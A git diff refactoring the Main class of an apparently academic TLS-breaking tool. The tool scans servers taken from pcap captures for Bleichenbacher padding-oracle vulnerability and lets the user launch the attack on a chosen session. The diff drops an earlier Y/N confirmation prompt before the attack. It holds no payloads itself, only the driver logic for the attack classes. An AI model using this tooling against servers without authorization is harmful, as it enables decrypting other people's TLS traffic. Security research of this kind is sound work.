@@ -22,7 +22,6 @@ import de.rub.nds.tlsbreaker.breakercommons.util.file.FileUtils;
 import de.rub.nds.tlsbreaker.breakercommons.util.pcap.PcapAnalyzer;
 import de.rub.nds.tlsbreaker.breakercommons.util.pcap.PcapSession;
 import org.apache.commons.codec.binary.Hex;
-import org.apache.commons.lang3.StringUtils;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
@@ -88,7 +87,7 @@ public class Main {
             String userOption = serverSelection.getValidUserSelection(uniqueServers);
             if ("a".equals(userOption)) {
                 // List<String> servers = serverSelection.getServers(sessions);
-                checkVulnerabilityOfAllServersAndDisplay(sessions, bleichenbacherCommandConfig);
+                checkVulnerabilityOfAllServersAndDisplay(uniqueServers, bleichenbacherCommandConfig, serverSessionsMap);
             } else {
                 // TODO: place this in else block?
                 // PcapSession session = sessions.get(Integer.parseInt(userOption) - 1);
@@ -120,7 +119,6 @@ public class Main {
 
     private static void displaySessionDetails(List<PcapSession> hostSessions) {
         DisplaySessionDetails(hostSessions);
-
     }
 
     private static Boolean checkVulnerability(BleichenbacherCommandConfig bleichenbacherCommandConfig) {
@@ -157,27 +155,45 @@ public class Main {
         CONSOLE.info("Select Option: ");
     }
 
-    private static void checkVulnerabilityOfAllServersAndDisplay(List<PcapSession> sessions,
-                                                                 BleichenbacherCommandConfig bleichenbacherCommandConfig) {
-        List<PcapSession> vulnerableServers = getVulnerableServers(sessions, bleichenbacherCommandConfig);
-        displayVulnerableServers(vulnerableServers);
+    private static void checkVulnerabilityOfAllServersAndDisplay(List<String> uniqueServers,
+                                                                 BleichenbacherCommandConfig bleichenbacherCommandConfig, Map<String, List<PcapSession>> serverSessionsMap) {
+        List<String> vulnerableServers = getVulnerableServers(uniqueServers, bleichenbacherCommandConfig);
+        CONSOLE.info("Found " + vulnerableServers.size() + " server that are vulnerable.");
+        if (!vulnerableServers.isEmpty()) {
+            displayVulnerableServers(vulnerableServers, serverSessionsMap);
+        }
         if (vulnerableServers.size() == 1) {
-            CONSOLE.info("Do you want to execute the attack on the server? (Y/N):");
-            Scanner sc = new Scanner(System.in);
-            String userInput = StringUtils.trim(sc.nextLine());
-            if ("Y".equals(userInput) || "y".equals(userInput)) {
-                // String serverToAttack = vulnerableServers.get(0);
-                executeAttack(vulnerableServers.get(0), bleichenbacherCommandConfig);
-            } else if ("N".equals(userInput) || "n".equals(userInput)) {
-                CONSOLE.info("Execution of the attack cancelled.");
-            } else {
-                throw new UnsupportedOperationException();
+            // CONSOLE.info("Do you want to execute the attack on the server? (Y/N):");
+            CONSOLE.info("Session details of " + vulnerableServers.get(0) + " server:");
+
+            List<PcapSession> hostSessions = serverSessionsMap.get(vulnerableServers.get(0));
+            displaySessionDetails(hostSessions);
+            // TODO: Uncomment
+            PcapSession selectedSession = getUserSelectedSession(hostSessions);
+            if (selectedSession != null) {
+                executeAttack(selectedSession, bleichenbacherCommandConfig);
             }
+
+            /*
+             * Scanner sc = new Scanner(System.in); String userInput = StringUtils.trim(sc.nextLine()); if
+             * ("Y".equals(userInput) || "y".equals(userInput)) { // String serverToAttack = vulnerableServers.get(0);
+             * executeAttack(vulnerableServers.get(0), bleichenbacherCommandConfig); } else if ("N".equals(userInput) ||
+             * "n".equals(userInput)) { CONSOLE.info("Execution of the attack cancelled."); } else { throw new
+             * UnsupportedOperationException(); }
+             */
         } else if (vulnerableServers.size() > 1) {
-            CONSOLE.info("Please select a server number to attack.");
+            CONSOLE.info("Please select a server to view session details.");
             CONSOLE.info("server number: ");
-            PcapSession serverToAttack = getUSerSelectionForAttack(vulnerableServers);
-            executeAttack(serverToAttack, bleichenbacherCommandConfig);
+            int serverNumber = getUserSelectedServer(uniqueServers);
+            String host = uniqueServers.get(serverNumber - 1);
+            List<PcapSession> hostSessions = serverSessionsMap.get(host);
+            displaySessionDetails(hostSessions);
+            // TODO: Uncomment
+            PcapSession selectedSession = getUserSelectedSession(hostSessions);
+            if (selectedSession != null) {
+                executeAttack(selectedSession, bleichenbacherCommandConfig);
+            }
+            // executeAttack(serverToAttack, bleichenbacherCommandConfig);
         }
 
     }
@@ -192,15 +208,17 @@ public class Main {
         attacker.attack();
     }
 
-    private static PcapSession getUSerSelectionForAttack(List<PcapSession> vulnerableServers) {
-        PcapSession selectedSession = null;
+    private static int getUserSelectedServer(List<String> uniqueServers) {
+        // PcapSession selectedSession = null;
         Scanner sc = new Scanner(System.in);
         try {
             int serverNumber = sc.nextInt();
-            if (serverNumber > 0 && serverNumber <= vulnerableServers.size()) {
-                selectedSession = vulnerableServers.get(serverNumber - 1);
-                // TODO: print entire information which is displayed to user when showing server options.
-                LOGGER.info("Selected server: " + selectedSession);
+            if (serverNumber > 0 && serverNumber <= uniqueServers.size()) {
+                return serverNumber;
+                /*
+                 * // TODO: print entire information which is displayed to user when showing server options.
+                 * LOGGER.info("Selected server: " + selectedSession);
+                 */
             } else {
                 throw new UnsupportedOperationException();
             }
@@ -209,16 +227,16 @@ public class Main {
             throw new UnsupportedOperationException();
         }
 
-        return selectedSession;
+        // return selectedSession;
     }
 
-    private static List<PcapSession> getVulnerableServers(List<PcapSession> sessions,
-                                                          BleichenbacherCommandConfig bleichenbacherCommandConfig) {
+    private static List<String> getVulnerableServers(List<String> uniqueServers,
+                                                     BleichenbacherCommandConfig bleichenbacherCommandConfig) {
 
-        List<PcapSession> vulnerableServers = new ArrayList<>();
-        for (PcapSession session : sessions) {
-            bleichenbacherCommandConfig.getClientDelegate().setHost(session.getDestinationHost());
-            bleichenbacherCommandConfig.setEncryptedPremasterSecret(getPreMasterSecret(session));
+        List<String> vulnerableServers = new ArrayList<>();
+        for (String server : uniqueServers) {
+            bleichenbacherCommandConfig.getClientDelegate().setHost(server);
+            // bleichenbacherCommandConfig.setEncryptedPremasterSecret(getPreMasterSecret(session));
 
             Attacker<? extends TLSDelegateConfig> attacker =
                     new BleichenbacherAttacker(bleichenbacherCommandConfig, bleichenbacherCommandConfig.createConfig());
@@ -227,7 +245,7 @@ public class Main {
                 Boolean result = attacker.checkVulnerability();
                 if (Objects.equals(result, Boolean.TRUE)) {
                     CONSOLE.error("Vulnerable:" + result.toString());
-                    vulnerableServers.add(session);
+                    vulnerableServers.add(server);
                 }
             } catch (UnsupportedOperationException e) {
                 LOGGER.info("The selected attacker is currently not implemented");
@@ -236,11 +254,11 @@ public class Main {
         return vulnerableServers;
     }
 
-    private static void displayVulnerableServers(List<PcapSession> sessions) {
+    private static void displayVulnerableServers(List<String> vulnerableServers,
+                                                 Map<String, List<PcapSession>> serverSessionsMap) {
 
-        CONSOLE.info("Found " + sessions.size() + " server that are vulnerable.");
         // TODO: Uncomment DisplayServerDetails
-        // DisplayServerDetails(sessions);
+        DisplayServerDetails(vulnerableServers, serverSessionsMap);
         /*
          * for (int i = 0; i < vulnerableServers.size(); i++) { CONSOLE.info(i + 1 + ") " + vulnerableServers.get(i)); }
          */
